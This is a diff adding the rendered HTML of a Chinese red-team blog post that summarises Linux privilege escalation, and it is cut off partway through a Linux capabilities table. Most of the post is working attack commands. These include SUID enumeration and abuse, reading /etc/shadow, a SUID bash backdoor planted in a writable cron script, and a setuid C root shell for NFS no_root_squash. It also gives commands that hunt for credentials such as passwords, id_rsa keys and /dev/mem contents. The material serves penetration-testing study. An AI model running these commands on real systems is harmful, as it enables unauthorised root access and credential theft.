@@ -1,37 +1,590 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/blog-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/blog-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-{% block page_class %}page-post-detail{% endblock %}
+<link rel="stylesheet" href="/css/main.css">
 
 
-{% block content %}
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l0n9w4y.cc","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.13.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="本文总结Linux环境下权限提升思路及方法...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权姿势总结">
+<meta property="og:url" content="https://l0n9w4y.cc/posts/29809/index.html">
+<meta property="og:site_name" content="L0n9w4y">
+<meta property="og:description" content="本文总结Linux环境下权限提升思路及方法...">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-06-11T14:21:26.000Z">
+<meta property="article:modified_time" content="2022-08-27T11:38:56.680Z">
+<meta property="article:author" content="L0n9w4y">
+<meta property="article:tag" content="Privilege Escalation">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://l0n9w4y.cc/posts/29809/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-Hans","comments":true,"permalink":"https://l0n9w4y.cc/posts/29809/","path":"posts/29809/","title":"Linux提权姿势总结"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Linux提权姿势总结 | L0n9w4y</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
     </div>
   </div>
 
-{% endblock %}
+  <div class="site-meta">
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">L0n9w4y</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-攻防"><a href="/security/" rel="section"><i class="fa fa-navicon fa-fw"></i>攻防</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-SUID%E6%8F%90%E6%9D%83"><span class="nav-number">1.</span> <span class="nav-text">0x01 SUID提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">1. 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">2. 漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-SUDO%E6%8F%90%E6%9D%83"><span class="nav-number">2.</span> <span class="nav-text">0x02 SUDO提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%AE%80%E4%BB%8B-1"><span class="nav-number">2.1.</span> <span class="nav-text">1. 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-number">2.2.</span> <span class="nav-text">2. 漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">0x03 计划任务提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%AE%80%E4%BB%8B-2"><span class="nav-number">3.1.</span> <span class="nav-text">1. 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="nav-number">3.2.</span> <span class="nav-text">2. 漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%AF%86%E7%A0%81%E5%A4%8D%E7%94%A8%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">0x04 密码复用提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%AE%80%E4%BB%8B-3"><span class="nav-number">4.1.</span> <span class="nav-text">1. 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-3"><span class="nav-number">4.2.</span> <span class="nav-text">2. 漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-NFS%E6%8F%90%E6%9D%83"><span class="nav-number">5.</span> <span class="nav-text">0x05 NFS提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%AE%80%E4%BB%8B-4"><span class="nav-number">5.1.</span> <span class="nav-text">1. 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-4"><span class="nav-number">5.2.</span> <span class="nav-text">2. 漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Capabilities%E5%88%A9%E7%94%A8"><span class="nav-number">6.</span> <span class="nav-text">0x06 Capabilities利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%AE%80%E4%BB%8B-5"><span class="nav-number">6.1.</span> <span class="nav-text">1. 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8F%AF%E7%94%A8%E6%96%87%E4%BB%B6%E6%9F%A5%E6%89%BE"><span class="nav-number">6.2.</span> <span class="nav-text">2. 可用文件查找</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-%E5%8F%82%E8%80%83%E8%B5%84%E6%BA%90"><span class="nav-number">7.</span> <span class="nav-text">0xFF 参考资源</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">L0n9w4y</p>
+  <div class="site-description" itemprop="description">攻防对抗，問道遠兮，求索未止...</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/L0n9w4y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;L0n9w4y" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/l0n9w4y" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;l0n9w4y" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/_L0n9_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;_L0n9_" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://l0n9w4y.cc/posts/29809/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="L0n9w4y">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L0n9w4y">
+      <meta itemprop="description" content="攻防对抗，問道遠兮，求索未止...">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Linux提权姿势总结 | L0n9w4y">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux提权姿势总结
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-06-11 22:21:26" itemprop="dateCreated datePublished" datetime="2021-06-11T22:21:26+08:00">2021-06-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-27 19:38:56" itemprop="dateModified" datetime="2022-08-27T19:38:56+08:00">2022-08-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">红队渗透</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <center>本文总结Linux环境下权限提升思路及方法...</center>
+
+<span id="more"></span>
+<hr>
+<h2 id="0x01-SUID提权"><a href="#0x01-SUID提权" class="headerlink" title="0x01 SUID提权"></a>0x01 SUID提权</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><pre><code>SUID是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行root用户所拥有的SUID的文件，那么就可以在运行该文件的时候获得root用户权限。
+</code></pre>
+<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
+<li>Linux命令查找SUID文件</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f -<span class="built_in">exec</span> <span class="built_in">ls</span> -la &#123;&#125; 2&gt;/dev/null \;</span><br><span class="line">find / -uid 0 -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>使用find命令以root权限命令执行</li>
+</ol>
+<p>Linux可以使用的命令提权姿势</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#Find</span><br><span class="line">find pentestlab -exec whoami \;</span><br><span class="line"></span><br><span class="line">#Vim</span><br><span class="line">vim.tiny /etc/shadow</span><br><span class="line"></span><br><span class="line">#awk</span><br><span class="line">awk &#x27;BEGIN&#123;system(&quot;whoami&quot;)&#125;&#x27;</span><br><span class="line"></span><br><span class="line">#curl</span><br><span class="line">curl file:///etc/shadow</span><br><span class="line"></span><br><span class="line">#Bash</span><br><span class="line">bash -p  </span><br><span class="line"></span><br><span class="line">#Less</span><br><span class="line">less /etc/passwd</span><br><span class="line"></span><br><span class="line">#Nmap</span><br><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-SUDO提权"><a href="#0x02-SUDO提权" class="headerlink" title="0x02 SUDO提权"></a>0x02 SUDO提权</h2><h3 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>sudo是linux系统管理指令，允许系统管理员让普通用户执行一些或者全部的root命令，如halt，reboot，su等等。sudo不是对shell的一个代替，它是面向每个命令的。</p>
+<p>它的特性主要有这样几点：</p>
+<ul>
+<li>sudo能够限制用户只在某台主机上运行某些命令。</li>
+<li>sudo提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务器。</li>
+<li>sudo使用时间戳文件来执行类似的“检票”系统。当用户调用sudo并且输入它的密码时，用户获得了一张存活期为5分钟的票（这个值可以在编译的时候改变）。</li>
+<li>sudo的配置文件是sudoers文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存放的位置默认是在&#x2F;etc&#x2F;sudoers，属性必须为0440。</li>
+</ul>
+<h3 id="2-漏洞利用-1"><a href="#2-漏洞利用-1" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
+<li>免密码执行sudo配置</li>
+</ol>
+<p>linux ALL&#x3D;(ALL) ALL<br>说明：linux用户可以从  ALL终端作为  ALL（任意）用户执行，并运行  ALL（任意）命令。</p>
+<ol start="2">
+<li>查看sudo权限</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grep -v -E &quot;^#&quot; /etc/passwd 2&gt;/dev/null| awk -F: &#x27;$3 == 0 &#123; print $1&#125;&#x27; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">grep -v -e &#x27;^$&#x27; /etc/sudoers 2&gt;/dev/null |grep -v &quot;#&quot; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">echo &#x27;&#x27; | sudo -S -l -k 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-计划任务提权"><a href="#0x03-计划任务提权" class="headerlink" title="0x03 计划任务提权"></a>0x03 计划任务提权</h2><h3 id="1-简介-2"><a href="#1-简介-2" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>如果未正确配置Cron，则可以利用它获得root特权。</p>
+<ol>
+<li>cron作业中是否有可写的脚本或二进制文件？</li>
+<li>我们可以覆盖cron文件本身吗？</li>
+<li>cron.d目录可写吗？</li>
+</ol>
+<p>Cron通常以root特权运行。如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。</p>
+<h3 id="2-漏洞利用-2"><a href="#2-漏洞利用-2" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
+<li><p>查看计划任务，找到有修改权限的计划任务脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br><span class="line">more /etc/crontab</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在mysqlback.sh 添加 SUID shell后门，当定时任务以root再次执行的时候，可以获取root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /tmp/shell</span><br><span class="line">chmod u+s /tmp/shell</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="0x04-密码复用提权"><a href="#0x04-密码复用提权" class="headerlink" title="0x04 密码复用提权"></a>0x04 密码复用提权</h2><h3 id="1-简介-3"><a href="#1-简介-3" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>如数据库、后台 web 密码，其他配置文件出现的密码，可能就是 root 密码</p>
+<h3 id="2-漏洞利用-3"><a href="#2-漏洞利用-3" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ul>
+<li>检查弱密码</li>
+<li>检查Web服务器连接到数据库的文件（config.php或类似文件）</li>
+<li>检查数据库以获取可能被重用的管理员密码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">grep --color=auto -rnw &#x27;/&#x27; -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">find . -type f -exec grep -i -I &quot;PASSWORD&quot; &#123;&#125; /dev/null \;</span><br><span class="line"></span><br><span class="line">strings /dev/mem -n10 | grep -i PASS</span><br><span class="line"></span><br><span class="line">locate password | more</span><br><span class="line"></span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;</span><br><span class="line"></span><br><span class="line">find / -name authorized_keys 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">find / -name id_rsa 2&gt; /dev/null</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-NFS提权"><a href="#0x05-NFS提权" class="headerlink" title="0x05 NFS提权"></a>0x05 NFS提权</h2><h3 id="1-简介-4"><a href="#1-简介-4" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>网络文件系统：网络文件系统允许客户端计算机上的用户通过网络挂载共享文件或目录。NFS使用远程过程调用（RPC）在客户端和服务器之间路由请求。<br>Root Squashing参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程root用户在连接时会分配一个用户“ nfsnobody ”，该用户具有最小的本地权限。如果 no_root_squash 选项开启的话的话”，并为远程用户授予root用户对所连接系统的访问权限。</p>
+<h3 id="2-漏洞利用-4"><a href="#2-漏洞利用-4" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
+<li><p>查看配置文件&#x2F;etc&#x2F;exports</p>
+</li>
+<li><p>kali挂载远程目录</p>
+</li>
+<li><p>在&#x2F;tmp&#x2F;test文件夹下创建c文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdlib.h&gt; </span><br><span class="line">#include &lt;sys/types.h&gt; </span><br><span class="line">#include &lt;unistd.h&gt; </span><br><span class="line">int main() &#123; setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;</span><br></pre></td></tr></table></figure>
+<p>编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc suid-shell.c -o suid-shell</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>回到目标主机&#x2F;tmp目录下执行suid-shell</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +s suid-shell</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>执行</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./suid-shell</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-Capabilities利用"><a href="#0x06-Capabilities利用" class="headerlink" title="0x06 Capabilities利用"></a>0x06 Capabilities利用</h2><h3 id="1-简介-5"><a href="#1-简介-5" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>linux中Capabilities的概念和suid类似，可以让普通用户授予超级用户的能力</p>
+<p><strong>Capabilities表</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">capability名称</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">CAPAUDITCONTROL</td>
+<td align="left">启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td>
+</tr>
+<tr>
+<td align="left">CAPAUDITREAD</td>
+<td align="left">允许通过 multicast netlink 套接字读取审计日志</td>
+</tr>
+<tr>
+<td align="left">CAPAUDITWRITE</td>
+<td align="left">将记录写入内核审计日志</td>
+</tr>
+<tr>
+<td align="left">CAPBLOCKSUSPEND</td>
+<td align="left">使用可以阻止系统挂起的特性</td>
+</tr>
+<tr>
+<td align="left">CAP_CHOWN</td>
+<td align="left">修改文件所有者的权限</td>
+</tr>
+<tr>
+<td align="left">CAPDACOVERRIDE</td>
+<td align="left">忽略文件的 DAC 访问限制</td>
+</tr>
+<tr>
+<td align="left">CAPDACREAD_SEARCH</td>
+<td align="left">忽略文件读及目录搜索的 DAC 访问限制</td>
+</tr>
+<tr>
+<td align="left">CAP_FOWNER</td>
+<td align="left">忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td>
+</tr>
+<tr>
+<td align="left">CAP_FSETID</td>
+<td align="left">允许设置文件的 setuid 位</td>
+</tr>
+<tr>
+<td align="left">CAPIPCLOCK</td>
+<td align="left">允许锁定共享内存片段</td>
+</tr>
+<tr>
+<td align="left">CAPIPCOWNER</td>
+<td align="left">忽略 IPC 所有权检查</td>
+</tr>
+<tr>
+<td align="left">CAP_KILL</td>
+<td align="left">允许对不属于自己的进程发送信号</td>
+</tr>
+<tr>
+<td align="left">CAP_LEASE</td>
+<td align="left">允许修改文件锁的 FL_LEASE 标志</td>
+</tr>
+<tr>
+<td align="left">CAPLINUXIMMUTABLE</td>
+<td align="left">允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td>
+</tr>
+<tr>
+<td align="left">CAPMACADMIN</td>
+<td align="left">允许 MAC 配置或状态更改</td>
+</tr>
+<tr>
+<td align="left">CAPMACOVERRIDE</td>
+<td align="left">忽略文件的 DAC 访问限制</td>
+</tr>
+<tr>
+<td align="left">CAP_MKNOD</td>
+<td align="left">允许使用 mknod() 系统调用</td>
+</tr>
+<tr>
+<td align="left">CAPNETADMIN</td>
+<td align="left">允许执行网络管理任务</td>
+</tr>
+<tr>
+<td align="left">CAPNETBIND_SERVICE</td>
+<td align="left">允许绑定到小于 1024 的端口</td>
+</tr>
+<tr>
+<td align="left">CAPNETBROADCAST</td>
+<td align="left">允许网络广播和多播访问</td>
+</tr>
+<tr>
+<td align="left">CAPNETRAW</td>
+<td align="left">允许使用原始套接字</td>
+</tr>
+<tr>
+<td align="left">CAP_SETGID</td>
+<td align="left">允许改变进程的 GID</td>
+</tr>
+<tr>
+<td align="left">CAP_SETFCAP</td>
+<td align="left">允许为文件设置任意的 capabilities</td>
+</tr>
+<tr>
+<td align="left">CAP_SETPCAP</td>
+<td align="left">参考 capabilities man page</td>
+</tr>
+<tr>
+<td align="left">CAP_SETUID</td>
+<td align="left">允许改变进程的 UID</td>
+</tr>
+<tr>
+<td align="left">CAPSYSADMIN</td>
+<td align="left">允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td>
+</tr>
+<tr>
+<td align="left">CAPSYSBOOT</td>
+<td align="left">允许重新启动系统</td>
+</tr>
+<tr>
+<td align="left">CAPSYSCHROOT</td>
+<td align="left">允许使用 chroot() 系统调用</td>
+</tr>
+<tr>
+<td align="left">CAPSYSMODULE</td>
+<td align="left">允许插入和删除内核模块</td>
+</tr>
+<tr>
+<td align="left">CAPSYSNICE</td>
+<td align="left">允许提升优先级及设置其他进程的优先级</td>
+</tr>
+<tr>
+<td align="left">CAPSYSPACCT</td>
+<td align="left">允许执行进程的 BSD 式审计</td>
+</tr>
+<tr>
+<td align="left">CAPSYSPTRACE</td>
+<td align="left">允许跟踪任何进程</td>
+</tr>
+<tr>
+<td align="left">CAPSYSRAWIO</td>
+<td align="left">允许直接访问 &#x2F;devport、&#x2F;dev&#x2F;mem、&#x2F;dev&#x2F;kmem 及原始块设备</td>
+</tr>
+<tr>
+<td align="left">CAPSYSRESOURCE</td>
+<td align="left">忽略资源限制</td>
+</tr>
+<tr>
+<td align="left">CAPSYSTIME</td>
+<td align="left">允许改变系统时钟</td>
+</tr>
+<tr>
+<td align="left">CAPSYSTTY_CONFIG</td>
+<td align="left">允许配置 TTY 设备</td>
+</tr>
+<tr>
+<td align="left">CAP_SYSLOG</td>
+<td align="left">允许使用 syslog() 系统调用</td>
+</tr>
+<tr>
+<td align="left">CAPWAKEALARM</td>
+<td align="left">允许触发一些能唤醒系统的东西(比如 CLOCKBOOTTIMEALARM 计时器)</td>
+</tr>
+</tbody></table>
